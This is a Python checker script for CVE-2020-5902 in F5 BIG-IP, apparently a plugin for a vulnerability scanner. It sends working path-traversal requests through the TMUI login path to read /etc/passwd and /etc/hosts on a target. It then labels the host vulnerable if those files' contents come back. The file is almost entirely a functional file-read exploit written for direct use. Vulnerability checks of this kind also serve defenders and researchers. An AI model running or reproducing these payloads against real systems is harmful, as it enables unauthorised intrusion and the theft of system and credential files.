#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/7/26 5:21 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : CVE_2020_5902_BIG_IP_RCE.py
# @Software: PyCharm

import requests
import time
import re

requests.packages.urllib3.disable_warnings()

class CVE_2020_5902_BIG_IP_RCE(object):
    def __init__(self):
        self.name = "CVE_2020_5902_BIG_IP_RCE"

    def runCheck(self, targetAddr, payload):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
        Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400"
        }
        if 'https://' in targetAddr:
            pass
        else:
            targetAddr = 'https://' + targetAddr

        if payload == 'CVE_2020_5902_BIG_IP_RCE':
            payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
            payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'
        else:
            data = '您的输入有误,或者没有加HTTPS请求头!'
            return {'status': 20001, 'data': data, 'type': 'status'}

        url1 = targetAddr + payload01
        url2 = targetAddr + payload02

        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        try:
            req1 = requests.get(url1, verify=False, headers=headers, timeout=5)
            req2 = requests.get(url2, verify=False, headers=headers, timeout=5)
        except requests.exceptions.RequestException as e:
            pass
        try:
            req = requests.get('{}/tmui/login.jsp'.format(targetAddr), verify=False, timeout=5)
        except requests.exceptions.RequestException as e:
            data = '[!]{} 请求超时! {}'.format(targetAddr, currentTime)
            return {'status': 20002, 'data': data, 'type': 'status'}
            pass
        if 'root' in req1.text or 'localhost' in req2.text:
            hostname = re.search(r'<p\stitle=\"(.*?)\">', req.text).group(1).strip().lower()
            data = '[+]{} - {} is vulnerable! {}'.format(targetAddr, hostname, currentTime)
            return {'status': 20003, 'data': data, 'type': 'status'}
        else:
            data = '[-]{} is unvulnerable! {}'.format(targetAddr, currentTime)
            return {'status': 20004, 'data': data, 'type': 'status'}
